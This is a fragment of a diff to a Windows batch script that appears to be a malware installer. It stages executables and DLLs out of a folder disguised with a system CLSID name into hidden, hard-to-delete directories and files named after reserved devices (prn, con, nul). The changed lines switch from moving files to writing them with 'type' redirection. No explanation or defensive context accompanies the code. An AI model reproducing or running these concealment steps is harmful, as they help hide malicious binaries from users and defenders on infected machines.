@@ -9,13 +9,13 @@ mkdir \\.\%ProgramData%\prndata..\
 mkdir \\.\%ProgramData%\condata..\
 
 copy /Y "%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Index.exe" "\\.\%ProgramData%\prndata..\prn.exe"
-move /Y "%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\IconLib.dll" "\\.\%ProgramData%\logdata..\prn"
+type "%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\IconLib.dll" > "\\.\%ProgramData%\prndata..\prn"
 
 copy /Y "%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Index.exe" "\\.\%ProgramData%\condata..\con.exe"
-move /Y "%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Kape.dll" "\\.\%ProgramData%\condata..\con"
+type "%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Kape.dll" > "\\.\%ProgramData%\prndata..\con"
 
 move /Y "%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Index.exe" "\\.\%ProgramData%\nuldata..\nul.exe"
-move /Y "%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\winfw.dll" "\\.\%ProgramData%\nuldata..\nul"
+type "%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\winfw.dll" > "\\.\%ProgramData%\prndata..\nul"
 
 move /Y "%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\libssl-1_1.dll" "\\.\%ProgramData%\nuldata..\"
 move /Y "%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\vcruntime140.dll" "\\.\%ProgramData%\nuldata..\"
